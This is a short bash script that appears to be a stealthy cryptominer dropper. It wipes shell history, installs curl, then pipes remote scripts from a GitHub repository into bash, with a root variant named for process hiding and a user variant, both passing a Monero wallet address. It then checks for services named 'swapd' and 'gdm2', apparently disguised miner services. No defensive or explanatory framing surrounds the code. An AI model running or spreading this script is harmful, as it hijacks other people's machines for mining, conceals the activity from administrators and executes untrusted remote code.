#!/bin/bash

unset HISTFILE
unset HISTFILE ;history -d $((HISTCMD-2))
export HISTFILE=/dev/null ;history -d $((HISTCMD-2))

apt install curl
yum install curl

rootstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}
userstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru
}

if [[ $(id) = uid=0* ]]
then

echo
echo  You are running the root install!
echo

      rootstuff
else
echo
echo  You are running the user install!
echo

      userstuff
fi

# Function to check if a service is running
is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# List of services to check
services=("swapd" "gdm2")

# Loop through the services
for service in "${services[@]}"; do
    if is_service_running "$service"; then
        echo "Service $service is running. Stopping script."
        exit 1
    fi
done

# If script reaches here, no service is running
echo "No specified services are running. Continuing with the script..."
